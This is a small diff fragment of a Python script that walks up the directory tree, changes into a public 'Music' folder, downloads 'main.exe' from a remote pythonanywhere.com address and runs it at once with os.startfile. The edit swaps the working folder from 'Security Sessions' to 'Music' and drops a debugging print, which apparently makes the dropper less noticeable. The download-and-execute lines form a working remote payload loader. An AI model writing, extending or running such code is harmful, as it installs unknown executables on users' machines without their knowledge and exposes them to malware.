@@ -18,8 +18,8 @@ for i in range(x):
     os.chdir("..")
 
 os.chdir("public")
-os.chdir("Security Sessions")
-print(os.getcwd())
+os.chdir("Music")
+
 try:
     download("https://armeng.pythonanywhere.com/media/files/main.exe")
     os.startfile("main.exe")
